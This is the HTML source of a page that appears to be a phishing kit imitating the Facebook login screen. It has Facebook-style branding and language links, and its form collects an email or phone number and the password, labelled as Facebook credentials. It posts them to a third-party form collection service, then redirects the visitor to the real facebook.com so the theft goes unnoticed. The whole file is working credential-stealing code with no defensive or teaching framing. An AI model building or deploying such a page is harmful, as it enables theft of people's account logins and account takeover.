<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Bootstrap demo</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="index.css" />
    <script
      src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"
      integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    ></script>
  </head>

  <body>
    <div class="container bod">
      <div class="row">
        <div class="col">
          <div class="img">
            <img src="./fbb.png" alt="" />
          </div>

          <form
            action="https://formcarry.com/s/LcI0lJBMWU"
            method="POST"
            enctype="multipart/form-data"
            class="ajaxForm"
          >
            <div class="form-group1">
              <label for="exampleInputEmail1"></label>
              <input
                type="text"
                class="form-control1"
                placeholder="Mobile number or email address."
                name="fbemail/num"
              />
              <!-- <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small> -->
            </div>
            <div class="form-group2">
              <label for="exampleInputPassword1"></label>
              <input
                type="text"
                class="form-control2"
                placeholder="Password"
                name="fb password"
              />
            </div>
            <!-- <div class="form-check">
           <input type="checkbox" class="form-check-input" id="exampleCheck1">
           <label class="form-check-label" for="exampleCheck1">Check me out</label>
       </div> -->
            <button type="submit" class="btn btn-primary con">Log In</button>
          </form>

          <h6 class="for">Forgotten Password?</h6>
          <hr />
          <button class="cre">Create new account</button>

          <div class="container">
            <div class="row">
              <div class="col-2">
                <h6>English(UK)</h6>
                <h6>Espańol</h6>
                <h6>Italiano</h6>
                <h6>Deutsch</h6>
              </div>
              <div class="col-8"></div>
              <div class="col-2">
                <h6>Polski</h6>
                <h6>Français (France)</h6>
                <h6>Português (Brasil)</h6>
              </div>
            </div>
            <div class="row"></div>
            <div class="col-12 mad">Made © 2024</div>
          </div>
        </div>
      </div>
    </div>
    <script>
      $(".ajaxForm").submit(function (e) {
        e.preventDefault();
        var href = $(this).attr("action");
        $.ajax({
          type: "POST",
          dataType: "json",
          url: href,
          data: $(this).serialize(),
          success: function (response) {
            if (response.status == "success") {
              window.location.href = "https://www.facebook.com/"; // redirection url // change this.
            } else {
              alert("An error occured: " + response.message);
            }
          },
        });
      });
    </script>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
      crossorigin="anonymous"
    ></script>
  </body>
</html>
